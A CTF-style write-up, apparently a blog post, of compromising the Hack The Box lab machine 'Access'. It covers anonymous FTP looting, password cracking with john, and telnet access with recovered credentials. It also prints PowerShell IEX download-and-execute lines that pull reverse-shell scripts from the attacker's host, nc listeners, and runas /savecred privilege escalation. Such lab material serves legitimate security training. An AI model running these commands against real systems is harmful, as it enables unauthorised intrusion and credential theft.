---
layout: post
title: "Access"
date: 2025-04-20 
categories: CTPS Playlist
---

# Access

## Summary

• ftp anonymous login
• wget to get files
• john to crack password
• strings to create wordlist from db file
• mdb-tables
• custom script to output tables into files
• 7z to see encryption methods in zip files
• IEX to download and execute files
• abusing runas and savecred

## Attack Path

First let’s enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/access 10.10.10.98

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Let’s check out anon authentication for ftp:

```bash
ftp 10.10.10.98

#we are in
cd Backup
binary    #need binary mode since the db data is binary, otherwise risk corruption
get backup.mdb
cd ../Engineer
get "Access Control.zip"
```

Another way to download:

```bash
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
```

We have a microsoft database:

```bash
file backup.mdb

backup.mdb: Microsoft Access Database

mdb-tables backup.mdb

#db is corrupt

mdb-export backup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,

#if we done this step, we immediately get the password
```

Let’s just use strings:

```bash
strings -n 8 backup.mdb
```

![image.png]({{ site.baseurl }}/assets/access/image.png)

It should contain some sort of password. Let’s keep that in mind and create a wordlist:

```bash
strings -n 8 backup.mdb > pwlist
```

The zip file requires a password:

```bash
7z e Access\ Control.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:6 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):

```

Let’s convert it to john hash:

```bash
zip2john "Access Control.zip" > access.hash
```

Now let’s see if there are any strings from the db that matches the password:

```bash
john --wordlist=pwlist access.hash

access4u@security (Access Control.zip/Access Control.pst)
```

Success!

We get a pst file:

```bash
file Access\ Control.pst 

Access Control.pst: Microsoft Outlook Personal Storage (>=2003, Unicode, version 23), dwReserved1=0x234, dwReserved2=0x22f3a, bidUnused=0000000000000000, dwUnique=0x39, 271360 bytes, bCryptMethod=1, CRC32 0x744a1e2e
```

Let’s convert it to mbox format so we can read it with evolution:

```bash
readpst Access\ Control.pst

open 'Access Control.mbox'
```

Now open it in evolution after importing it from the pop up prompt.

![image.png]({{ site.baseurl }}/assets/access/image%201.png)

There’s the web page and port 23 which we haven’t checked out yet. Let’s look at the web page

![image.png]({{ site.baseurl }}/assets/access/image%202.png)

Let’s fuzz the server:

```bash
feroxbuster -u http://10.10.10.98/

301      GET        2l       10w      156c http://10.10.10.98/aspnet_client => http://10.10.10.98/aspnet_client/
200      GET      274l     1766w   162337c http://10.10.10.98/out.jpg
200      GET       14l       31w      391c http://10.10.10.98/
301      GET        2l       10w      156c http://10.10.10.98/Aspnet_client => http://10.10.10.98/Aspnet_client/
301      GET        2l       10w      156c http://10.10.10.98/aspnet_Client => http://10.10.10.98/aspnet_Client/
301      GET        2l       10w      167c http://10.10.10.98/aspnet_client/system_web => http://10.10.10.98/aspnet_client/system_web/
301      GET        2l       10w      156c http://10.10.10.98/ASPNET_CLIENT => http://10.10.10.98/ASPNET_CLIENT/
301      GET        2l       10w      167c http://10.10.10.98/Aspnet_client/system_web => http://10.10.10.98/Aspnet_client/system_web/

```

![image.png]({{ site.baseurl }}/assets/access/image%203.png)

Let’s check out port 23. Nmap tells us that it’s potentially using telnet. Let’s try:

```bash
telnet 10.10.10.98 23
```

![image.png]({{ site.baseurl }}/assets/access/image%204.png)

Let’s try the security login:

```bash
security:4Cc3ssC0ntr0ller
```

We are in:

![image.png]({{ site.baseurl }}/assets/access/image%205.png)

```bash
dir C:\

08/23/2018  11:05 PM    <DIR>          inetpub
07/14/2009  04:20 AM    <DIR>          PerfLogs
08/23/2018  09:53 PM    <DIR>          Program Files
08/24/2018  08:40 PM    <DIR>          Program Files (x86)
08/24/2018  08:39 PM    <DIR>          temp
08/21/2018  11:31 PM    <DIR>          Users
07/14/2021  02:04 PM    <DIR>          Windows
08/22/2018  08:23 AM    <DIR>          ZKTeco
```

We do not have any privileges on the machine.

Let’s get a better shell like ConPTYShell.

```bash
cp /home/kali/tools/Invoke-ConPtyShell.ps1 shell.ps1

python3 -m http.server 8001
```

Now start a listener:

```bash
stty raw -echo; (stty size; cat) | nc -lvnp 3001

```

On the telnet shell:

```bash

powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7:8001/shell.ps1')

```

Does not work.  Let’s just try a simple shell from nishang; change the IP and port to our desired:

```bash
#attack host
nc -lnvp 4444

#target
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7:8001/rev.ps1')
```

We now have a better shell:

![image.png]({{ site.baseurl }}/assets/access/image%206.png)

```bash
cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

We can run commands as Administrator:

```bash
runas /savecred /user:ACCESS\Administrator "whoami"

runas /savecred /user:ACCESS\Administrator "dir"

```

Because we are in a reverse shell, normal stdin/out are not outputted to us. Let’s get another reverse shell:

```bash
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7:8001/rev2.ps1')

runas /savecred /user:ACCESS\Administrator "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7:8001/rev2.ps1')"

#if this doesn't work, try powershell encoding
```

We now have Administrator shell.